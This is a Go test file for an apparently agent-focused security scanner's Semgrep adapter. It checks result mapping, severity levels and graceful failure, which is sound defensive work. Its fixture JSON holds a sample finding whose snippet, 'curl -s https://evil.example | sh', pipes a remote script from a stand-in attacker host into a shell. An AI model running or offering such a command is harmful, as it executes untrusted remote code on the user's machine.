package analyze

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/alexverify/agentguard/internal/domain/artifact"
	"github.com/alexverify/agentguard/internal/domain/finding"
	"github.com/alexverify/agentguard/internal/platform/run"
)

// fakeSemgrep returns a Semgrep wired to a scripted runner, with a real rules
// dir so the existence check passes.
func fakeSemgrep(t *testing.T, out []byte, err error) (*Semgrep, string, string) {
	t.Helper()
	rules := t.TempDir()
	root := t.TempDir()
	s := &Semgrep{RulesDir: rules, bin: "semgrep"}
	key := strings.Join(append([]string{"semgrep"}, semgrepArgs(rules, root)...), " ")
	s.runner = &run.Fake{Responses: map[string]run.FakeResponse{key: {Out: out, Err: err}}}
	return s, rules, root
}

const semgrepJSON = `{
  "results": [
    {
      "check_id": "rules.curl-pipe-shell",
      "path": "%ROOT%/install.sh",
      "start": {"line": 3},
      "extra": {
        "severity": "ERROR",
        "message": "Remote script piped into a shell.",
        "lines": "curl -s https://evil.example | sh",
        "metadata": {"owasp-agentic": "ASK-02"}
      }
    },
    {
      "check_id": "rules.subprocess-shell-true",
      "path": "%ROOT%/tool.py",
      "start": {"line": 10},
      "extra": {
        "severity": "WARNING",
        "message": "subprocess with shell=True.",
        "lines": "subprocess.run(cmd, shell=True)",
        "metadata": {}
      }
    }
  ],
  "errors": []
}`

func TestSemgrepMapsResultsToFindings(t *testing.T) {
	s, _, root := fakeSemgrep(t, nil, nil)
	// Real semgrep emits forward-slash paths in its JSON; a raw Windows path
	// (C:\…) would also be invalid JSON (\U is not an escape). Use slashes.
	out := strings.ReplaceAll(semgrepJSON, "%ROOT%", filepath.ToSlash(root))
	s.runner.(*run.Fake).Responses[strings.Join(append([]string{"semgrep"}, semgrepArgs(s.RulesDir, root)...), " ")] = run.FakeResponse{Out: []byte(out)}

	fs, err := s.Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatalf("Analyze: %v", err)
	}
	if len(fs) != 2 {
		t.Fatalf("got %d findings, want 2: %+v", len(fs), fs)
	}

	f := fs[0]
	if f.RuleID != "SEMGREP-CURL-PIPE-SHELL" {
		t.Errorf("RuleID = %q", f.RuleID)
	}
	if f.Severity != finding.SeverityHigh {
		t.Errorf("Severity = %q, want high (ERROR)", f.Severity)
	}
	if f.OWASP != "ASK-02" {
		t.Errorf("OWASP = %q", f.OWASP)
	}
	if f.File != "install.sh" {
		t.Errorf("File = %q, want path relative to root", f.File)
	}
	if f.Line != 3 {
		t.Errorf("Line = %d", f.Line)
	}
	if !strings.Contains(f.Snippet, "curl") || f.Explanation == "" {
		t.Errorf("Snippet/Explanation not mapped: %+v", f)
	}
	if fs[1].Severity != finding.SeverityMedium {
		t.Errorf("WARNING must map to medium, got %q", fs[1].Severity)
	}
}

func TestSemgrepUnavailableIsNoOp(t *testing.T) {
	s := &Semgrep{RulesDir: t.TempDir()} // bin empty
	fs, err := s.Analyze(context.Background(), artifact.Artifact{}, t.TempDir())
	if err != nil || fs != nil {
		t.Fatalf("unavailable semgrep must be a silent no-op, got %v, %v", fs, err)
	}
}

func TestSemgrepMissingRulesDirIsNoOp(t *testing.T) {
	s := &Semgrep{RulesDir: filepath.Join(t.TempDir(), "absent"), bin: "semgrep"}
	s.runner = &run.Fake{} // would error if invoked
	fs, err := s.Analyze(context.Background(), artifact.Artifact{}, t.TempDir())
	if err != nil || fs != nil {
		t.Fatalf("missing rules dir must be a silent no-op, got %v, %v", fs, err)
	}
}

func TestSemgrepExecFailureDegrades(t *testing.T) {
	s, _, root := fakeSemgrep(t, nil, errors.New("semgrep exploded"))
	fs, err := s.Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil || fs != nil {
		t.Fatalf("a failing semgrep must never break the scan, got %v, %v", fs, err)
	}
}

func TestSemgrepGarbageOutputDegrades(t *testing.T) {
	s, _, root := fakeSemgrep(t, []byte("not json"), nil)
	fs, err := s.Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil || fs != nil {
		t.Fatalf("unparseable output must never break the scan, got %v, %v", fs, err)
	}
}

func TestSemgrepArgsExcludeVendorDirs(t *testing.T) {
	args := semgrepArgs("rules", "/proj")
	joined := strings.Join(args, " ")
	for _, want := range []string{"scan", "--json", "--config rules", "--exclude node_modules", "--exclude .venv"} {
		if !strings.Contains(joined, want) {
			t.Errorf("args missing %q: %s", want, joined)
		}
	}
	if args[len(args)-1] != "/proj" {
		t.Errorf("target must be the last arg: %s", joined)
	}
}

// Guard: rules shipped in the repo's rules/ dir must be valid YAML mappings
// with the fields the adapter relies on.
func TestShippedRulesParse(t *testing.T) {
	dir := filepath.Join("..", "..", "..", "rules")
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Skipf("rules dir not present: %v", err)
	}
	n := 0
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".yaml") || strings.HasSuffix(e.Name(), ".yml") {
			n++
			b, err := os.ReadFile(filepath.Join(dir, e.Name()))
			if err != nil {
				t.Fatal(err)
			}
			for _, field := range []string{"rules:", "id:", "severity:", "message:", "languages:"} {
				if !strings.Contains(string(b), field) {
					t.Errorf("%s missing %q", e.Name(), field)
				}
			}
		}
	}
	if n == 0 {
		t.Error("no rule files shipped in rules/")
	}
}
